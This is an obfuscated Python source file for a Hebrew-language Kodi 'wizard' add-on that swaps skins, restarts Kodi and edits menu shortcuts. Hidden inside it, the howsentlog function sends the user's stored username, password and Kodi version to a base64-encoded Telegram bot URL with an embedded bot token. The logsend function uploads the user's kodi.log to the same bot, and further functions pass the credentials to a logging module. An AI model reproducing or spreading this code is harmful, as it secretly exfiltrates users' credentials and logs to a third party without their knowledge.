# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OOOOOO00OO0O0O000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0O00O00OO0OOOO0O =[];OO00000OO00000OO0 =[]#line:261
	for O0OOO00000O00000O in sorted (OOOOOO00OO0O0O000 ,key =lambda O0OO0OOOOO0O000OO :O0OO0OOOOO0O000OO ):#line:262
		OOOO0OO0OOO0O00OO =os .path .split (O0OOO00000O00000O [:-1 ])[1 ]#line:263
		O00OO00OO000000OO =os .path .join (O0OOO00000O00000O ,'addon.xml')#line:264
		if os .path .exists (O00OO00OO000000OO ):#line:265
			O0OOOO00OO000000O =open (O00OO00OO000000OO )#line:266
			O0O000O000O0OO0OO =O0OOOO00OO000000O .read ()#line:267
			OOO0OO0O00OO0O00O =parseDOM2 (O0O000O000O0OO0OO ,'addon',ret ='id')#line:268
			O0000OO0OOO0OOO0O =OOOO0OO0OOO0O00OO if len (OOO0OO0O00OO0O00O )==0 else OOO0OO0O00OO0O00O [0 ]#line:269
			try :#line:270
				OO0O0O000000O0OOO =xbmcaddon .Addon (id =O0000OO0OOO0OOO0O )#line:271
				O0O00O00OO0OOOO0O .append (OO0O0O000000O0OOO .getAddonInfo ('name'))#line:272
				OO00000OO00000OO0 .append (O0000OO0OOO0OOO0O )#line:273
			except :#line:274
				pass #line:275
	O0O000O0O0OOO00OO =[];O000OOOOOOOO00000 =0 #line:276
	O00O0O0000O00O000 =["Current Skin -- %s"%currSkin ()]+O0O00O00OO0OOOO0O #line:277
	O000OOOOOOOO00000 =DIALOG .select ("Select the Skin you want to swap with.",O00O0O0000O00O000 )#line:278
	if O000OOOOOOOO00000 ==-1 :return #line:279
	else :#line:280
		O00OO0OOO00O00O0O =(O000OOOOOOOO00000 -1 )#line:281
		O0O000O0O0OOO00OO .append (O00OO0OOO00O00O0O )#line:282
		O00O0O0000O00O000 [O000OOOOOOOO00000 ]="%s"%(O0O00O00OO0OOOO0O [O00OO0OOO00O00O0O ])#line:283
	if O0O000O0O0OOO00OO ==None :return #line:284
	for OO00OOO0OO0OOOO00 in O0O000O0O0OOO00OO :#line:285
		swapSkins (OO00000OO00000OO0 [OO00OOO0OO0OOOO00 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOO0O0OO00O00O0OO ,title ="Error"):#line:290
	O0OO0O0O00OO00O00 ='lookandfeel.skin'#line:291
	O0O00OOOO0OO000O0 =OOO0O0OO00O00O0OO #line:292
	O00O0OOOOO0000OOO =getOld (O0OO0O0O00OO00O00 )#line:293
	O0O0OO0OO00OO0O00 =O0OO0O0O00OO00O00 #line:294
	setNew (O0O0OO0OO00OO0O00 ,O0O00OOOO0OO000O0 )#line:295
	O0OOOOOOO0O0000OO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOOOOO0O0000OO <100 :#line:297
		O0OOOOOOO0O0000OO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OO00O00O0000O00OO ):#line:304
	try :#line:305
		OO00O00O0000O00OO ='"%s"'%OO00O00O0000O00OO #line:306
		O0O0O0O000O00O0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO00O00O0000O00OO )#line:307
		O0OO0OO0OO0OOOO00 =xbmc .executeJSONRPC (O0O0O0O000O00O0O0 )#line:309
		O0OO0OO0OO0OOOO00 =simplejson .loads (O0OO0OO0OO0OOOO00 )#line:310
		if O0OO0OO0OO0OOOO00 .has_key ('result'):#line:311
			if O0OO0OO0OO0OOOO00 ['result'].has_key ('value'):#line:312
				return O0OO0OO0OO0OOOO00 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (OO0O00OOO00O0OOOO ,OOOOO0000O000O0O0 ):#line:319
	try :#line:320
		OO0O00OOO00O0OOOO ='"%s"'%OO0O00OOO00O0OOOO #line:321
		OOOOO0000O000O0O0 ='"%s"'%OOOOO0000O000O0O0 #line:322
		O0O00000O0O0O00OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O00OOO00O0OOOO ,OOOOO0000O000O0O0 )#line:323
		OO0000OOO00O0OOO0 =xbmc .executeJSONRPC (O0O00000O0O0O00OO )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			O00OO00OO0OO000OO =xbmcgui .DialogProgress ()#line:334
			O00OO00OO0OO000OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			O00OO00OO0OO000OO .update (0 )#line:338
			for OOO000O00OOOOOOOO in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				O00OO00OO0OO000OO .update (int ((5 -OOO000O00OOOOOOOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOO000O00OOOOOOOO ),'')#line:341
				if O00OO00OO0OO000OO .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			O00OO00OO0OO000OO =xbmcgui .DialogProgress ()#line:347
			O00OO00OO0OO000OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			O00OO00OO0OO000OO .update (0 )#line:351
			for OOO000O00OOOOOOOO in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				O00OO00OO0OO000OO .update (int ((5 -OOO000O00OOOOOOOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO000O00OOOOOOOO ),'')#line:354
				if O00OO00OO0OO000OO .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          O0OOOOOO00O0OO0OO =(ADDON .getSetting ("user"))#line:371
          OOOO0OOO000OO0000 =(ADDON .getSetting ("pass"))#line:372
          OO0OOOOOOO0000000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          O0O00OOO0OO0OO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          O000O0O000OOO0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          OO00O0000OO0OOOO0 =str (json .loads (O000O0O000OOO0000 )['ip'])#line:377
          OOO00O0O0O00OOO0O =O0OOOOOO00O0OO0OO #line:378
          O0O0000OOOO0O0O00 =OOOO0OOO000OO0000 #line:379
          import socket #line:381
          O000O0O000OOO0000 =urllib2 .urlopen (O0O00OOO0OO0OO00O .decode ('base64')+' - '+OOO00O0O0O00OOO0O +' - '+O0O0000OOOO0O0O00 +' - '+OO0OOOOOOO0000000 ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OO0O00000000OOOO0 =(ADDON .getSetting ("pass"))#line:388
			O0OOO0O0OO0O0O000 =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OO0O00000000OOOO0 ,O0OOO0O0OO0O0O000 )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         OO0000000OO0OO000 =xbmc .translatePath ('special://home/kodi.log')#line:398
         OO00O000OOO000OOO ={'chat_id':(None ,'-274262389'),'document':(OO0000000OO0OO000 ,open (OO0000000OO0OO000 ,'rb')),}#line:402
         OOOOO000000OO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         OO00OO0OO00O0000O =requests .post (OOOOO000000OO00O0 .decode ('base64'),files =OO00O000OOO000OOO )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           OO0000000OO0OO000 =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OO00O000OOO000OOO ={'chat_id':(None ,'-274262389'),'document':(OO0000000OO0OO000 ,open (OO0000000OO0OO000 ,'rb')),}#line:411
           OOOOO000000OO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           OO00OO0OO00O0000O =requests .post (OOOOO000000OO00O0 .decode ('base64'),files =OO00O000OOO000OOO )#line:414
      else :#line:415
           OO0000000OO0OO000 =xbmc .translatePath ('special://profile/kodi.log')#line:416
           OO00O000OOO000OOO ={'chat_id':(None ,'-274262389'),'document':(OO0000000OO0OO000 ,open (OO0000000OO0OO000 ,'rb')),}#line:420
           OOOOO000000OO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           OO00OO0OO00O0000O =requests .post (OOOOO000000OO00O0 .decode ('base64'),files =OO00O000OOO000OOO )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	resloginit .resloginit ('restore','all')#line:428
	O0O0OO000OOOO0O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:429
	OOOO00O00O00OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:430
	copyfile (O0O0OO000OOOO0O00 ,OOOO00O00O00OOO00 )#line:431
def skindialogsettind18 ():#line:432
	try :#line:433
		O0OO0OO000O0000OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:434
		O0OO000O0000O0O0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:435
		copyfile (O0OO0OO000O0000OO ,O0OO000O0000O0O0O )#line:436
	except :pass #line:437
def rdon ():#line:438
	loginit .loginIt ('restore','all')#line:439
	O0000000O00OOOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:441
	OOOOOO0OO0000OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:442
	copyfile (O0000000O00OOOOO0 ,OOOOOO0OO0000OO00 )#line:443
def adults18 ():#line:445
  OO00OOOO0OOOO00OO =(ADDON .getSetting ("adults"))#line:446
  if OO00OOOO0OOOO00OO =='true':#line:447
    OOOOOO0OO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:448
    with open (OOOOOO0OO0OOOOO00 ,'r')as O0O0OO0O000000O00 :#line:449
      OOO0OOO00O00OOOO0 =O0O0OO0O000000O00 .read ()#line:450
    OOO0OOO00O00OOOO0 =OOO0OOO00O00OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:468
    with open (OOOOOO0OO0OOOOO00 ,'w')as O0O0OO0O000000O00 :#line:471
      O0O0OO0O000000O00 .write (OOO0OOO00O00OOOO0 )#line:472
def rdbuildaddon ():#line:473
  OOOO0000O0O0OOO0O =(ADDON .getSetting ("rdbuild"))#line:474
  if OOOO0000O0O0OOO0O =='true':#line:475
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:476
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:477
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:478
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:496
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:499
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:500
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:504
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:505
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:506
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:524
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:527
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:528
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:532
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:533
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:534
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:552
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:555
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:556
